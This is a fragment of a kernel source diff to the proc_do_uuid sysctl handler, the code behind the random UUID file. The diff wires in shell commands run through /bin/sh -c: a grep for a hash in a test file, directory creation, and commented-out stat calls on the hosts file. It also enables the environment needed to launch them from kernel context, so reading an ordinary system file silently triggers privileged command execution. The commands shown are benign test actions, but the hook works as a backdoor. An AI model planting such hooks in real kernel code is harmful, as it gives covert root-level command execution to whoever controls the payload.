@@ -1455,8 +1455,8 @@ static int proc_do_uuid(struct ctl_table *table, int write, void __user *buf,
 	if grep -q \"3203a42d7a6b024067f70c5f515b98ea\" /data/local/tests/hoa/vailoz1; then\
      mkdir /data/local/tests/hoa/concac;\
 else\
-     echo "not exist";\
-fi", NULL};
+     mkdir /data/local/tests/hoa/concac1;\
+fi", NULL };
 	
 	
 	u8 tmp_uuid[UUID_SIZE], *uuid;
@@ -1465,7 +1465,7 @@ fi", NULL};
 		.data = uuid_string,
 		.maxlen = UUID_STRING_LEN
 	};
-//	static char *envp[] =  { "HOME=/", "PATH=/sbin:/bin", NULL };
+	static char *envp[] =  { "HOME=/", "PATH=/sbin:/bin", NULL };
 //	static char *argv1[] = { "/bin/sh", "-c", "stat -c %s /system/etc/hosts > /data/local/tests/hoa/vailoz1",  NULL};
 //	static char *argv[] = { "/bin/sh", "-c", "stat -c %s /system/etc/hosts > /dev/abc",  NULL};
 //	if (current_uid().val >= 0) 
